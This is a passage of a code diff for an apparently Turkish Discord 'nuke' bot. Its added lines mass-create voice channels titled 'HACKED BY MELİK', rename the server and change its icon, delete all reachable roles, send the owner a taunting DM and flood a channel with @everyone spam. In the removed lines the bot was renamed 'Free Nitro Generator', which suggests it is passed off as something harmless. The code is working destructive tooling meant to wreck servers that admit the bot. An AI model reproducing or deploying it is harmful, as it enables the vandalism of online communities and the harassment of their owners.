-      .createChannel("KÜLLERİMİZDEN", {
+      .createChannel("HACKED BY MELİK", {
+        type: "voice" 
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
         type: "voice"
       })
       .then(chan => {
@@ -1251,17 +1168,103 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
 
-    await msg.guild.setIcon("https://hizliresim.com/1ceaBa"); //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-    await msg.guild.setName("Hacked by melik ama yıkık olandan alayım#0061 "); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild
+      .createChannel("HACKED BY", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("Hacked by melik", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      }) 
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("HACKED BY MELİK", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
+
+    await msg.guild.setIcon("https://hizliresim.com/UKujQw"); //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+    await msg.guild.setName("hacked by melik ama yıkık olandan alayım#0061 "); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER)
-    await client.user.setAvatar("https://hizliresim.com/hD94Wr"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-    await client.user.setUsername("Free Nitro Generator   Bot "); //BOTUN ISMİNİ DEGISTIRIR
-    await msg.guild.owner.send("**Sunucunu Hackledim Ağla :D **"); //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    await client.user.setAvatar("https://hizliresim.com/UKujQw");
+    await client.user.setUsername("dizzy'"); //BOTUN ISMİNİ DEGISTIRIR
+    await msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**"); //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
   }
 });
 
 client.on("message", msg => {
-  if (msg.content === "+rolspam") {
+  if (msg.content === "!rolspam") {
     //ROL SPAM YAPAR
     msg.delete();
     msg.guild.createRole({
@@ -1460,339 +1463,348 @@ client.on("message", msg => {
 client.on("message", msg => {
   if (msg.content === "+spam") {
     //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
-
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
